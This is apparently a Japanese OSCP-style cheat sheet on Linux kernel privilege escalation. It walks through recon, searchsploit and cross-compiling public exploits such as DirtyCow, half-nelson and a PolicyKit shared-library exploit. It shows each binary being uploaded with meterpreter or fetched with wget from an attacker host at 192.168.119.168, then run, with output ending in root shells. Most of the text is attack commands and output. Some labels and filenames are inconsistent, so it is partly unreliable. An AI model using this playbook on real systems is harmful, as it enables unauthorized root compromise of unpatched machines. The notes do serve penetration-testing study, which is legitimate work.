# Kernel Vulnerabilities

まずはOSのバージョンを精査

```
cat /etc/issue
uname -r
arch
```

searchsploitする

```
searchsploit linux kernel ubuntu 16.04
```

PoCをコンパイルする（ターゲットのアーキテクチャに合わせる）

```
gcc 43418.c -o exploit
ls -lah exploit
```



* kernel番号で直接検索すると以外とexploitが簡単に見つかる場合がある。



### ubuntu 16.04(45010)

* 攻撃対象ホストがgccを持っているか確認する

  ```bash
  gcc
  find / -name gcc -type f 2>/dev/null
  ```

* ない場合、kaliでコンパイルする

  ```bash
  gcc -static 45010.c -o 45010
  ```

* meterpreterでアップロードする

  ```bash
  meterpreter > upload /home/kali/Documents/OSCP/24.Assembling_the_peces/45010 /tmp/
  ```

* 実行する

  ```bash
  chmod +x 45010
  ./45010
  ```



### dirtycow debian7.3

* Exploit-DBのPoC(40611.c)は事前に`sudo -s`ができてroot:root権限のファイルを作れる前提になっておりPEには不適切

* Exploit-DBのPoC(dirtycow2)は、32bitでクロスコンパイルすると-lcryptがないと怒られてコンパイルがおそらく不可

* 結局以下githubのPoCでPEできる

  https://github.com/exrienz/DirtyCow/blob/master/dc32.c

  * コンパイルする

  ```bash
  gcc -m32 -static cowroot2.c -o cowroot -pthread
  ```

  * 配送する

    ```bash
    wget http://192.168.119.168/cowroot -O cowroot
    ```

  * 実行する

    ```bash
    mongodb@humble:/tmp$ chmod +x cowroot
    chmod +x cowroot
    mongodb@humble:/tmp$ ./cowroot
    ./cowroot
    DirtyCow root privilege escalation
    Backing up /usr/bin/passwd.. to /tmp/bak
    Size of binary: 45396
    Racing, this may take a while..
    thread stopped
    /usr/bin/passwd is overwritten
    Popping root shell.
    Don't forget to restore /tmp/bak
    thread stopped
    root@humble:/tmp# echo 0 > /proc/sys/vm/dirty_writeback_centisecs
    echo 0 > /proc/sys/vm/dirty_writeback_centisecs
    ```

  * 注意点

    ttyは/bin/shではなく/bin/bashでした方がよい。

  

### 2.6.32-21-generic-pae (#32-Ubuntu)

https://www.exploit-db.com/exploits/17787

```
serachsploit -p 17787
```

```bash
# 攻撃対象ホスト
wget http://192.168.119.168/17787.c -O 17787.c
```

```bash
# 攻撃対象ホスト
gcc 14814.c -o half-nelson -lrt
```

```bash
./half-nelson
./half-nelson
[+] looking for symbols...
[+] resolved symbol commit_creds to 0xc0176140
[+] resolved symbol prepare_kernel_cred to 0xc0176480
[+] setting up exploit payload...
[+] creating PF_CAN socket...
[+] connecting PF_CAN socket...
[+] clearing out any active OPs via RX_DELETE...
[+] removing any active user-owned shmids...
[+] massaging kmalloc-96 SLUB cache with dummy allocations
[+] corrupting BCM OP with truncated allocation via RX_SETUP...
[+] mmap'ing truncated memory to short-circuit/EFAULT the memcpy_fromiovec...
[+] mmap'ed mapping of length 328 at 0xb785e000
[+] smashing adjacent shmid with dummy payload via malformed RX_SETUP...
[+] seeking out the smashed shmid_kernel...
[+] discovered our smashed shmid_kernel at shmid[149] = 5537941
[+] re-smashing the shmid_kernel with exploit payload...
[+] launching root shell!
root@core:/tmp# 
```



### CVE2021-4043(PolicyKit ubuntu16.04)

https://www.exploit-db.com/exploits/50689

```
vi evil-so.c
```

```
vi exploit.c
```

```bash
#kali
gcc -shared -o evil.so -fPIC evil-so.c
gcc -static exploit.c -o exploit
```

```bash
#攻撃対象端末
./exploit
```



### sharedでライブラリがないと怒られる場合

古いバージョンのdebianをdockerで立ててコンパイルする

https://forums.offensive-security.com/showthread.php?48259-Fix-for-incompatibility-with-older-versions-of-gcc-Kali-2022-3

```bash
kali@kali:~$ sudo docker pull debian:10
kali@kali:~$ mkdir ~/docker_shared
kali@kali:~$ docker run --name debian10 -v ~/docker_shared:/media -it debian:10 /bin/bash
```

```
root@e3edde4cb3e3:/#
```

```
kali@kali:~$ docker stop/start debian10
```

```
kali@kali:~$ docker exec -it debian10 /bin/bash
```

* コンパイルするときは`/media`に移動してコマンド実行する(kaliの`~/docker_shared`ディレクトリに配置される)



### gccコマンド

```
gcc -m32 -Wall -Wl,--hash-style=both -o linux-sendpage 9542.c
```

* -staticを付ける場合とつけない場合どちらも試してみる必要がある。

  -staticでやることで`segmentation fault`が発生する場合もある

* -m32：32bitCPU版でコンパイルする場合に付与する。アーキテクチャが違うと`cannot excecute`的なエラーが出る

* -Wl,--hash-style=both：`error while loading shared libraries: requires glibc 2.5 or later dynamic linker`が出た場合に付与する



↓↓↓クロスコンパイルについて詳しく説明してくれている

https://forums.offensive-security.com/showthread.php?33885-Rooted-Comments-on-cross-compiling-binaries-for-32-bit-Linux-OS-and-a-small-hint

↓↓↓kaliの最新バージョンのコンパイラについて言及している

https://forums.offensive-security.com/showthread.php?48259-Fix-for-incompatibility-with-older-versions-of-gcc-Kali-2022-3



### その他

* ttyがないと実行時に`sh: [XXXXX: 4] tcsetattr: Invalid argument`のようなエラーとなる。ttyがないか確認してなければコマンド実行する

  ```
  sh: [15273: 5] tcsetattr: Invalid argument
  sh-3.00$ tty
  not a tty
  ```

  ```
  python2 -c 'import pty; pty.spawn("/bin/sh")'
  ```

* 必要な動的ライブラリを確認する

  ```
  ldd <実行ファイル>
  ```

* カーネルのバージョンを必ず確認

  ```
  uname -r
  2.6.9-89.EL
  ```

* OSのバージョンを必ず確認

  ```
  sh-3.00$ cat /etc/issue
  CentOS release 4.8 (Final)
  Kernel \r on an \m
  ```

* アーキテクチャーを必ず確認

  ```
  arch
  i686
  ```

  
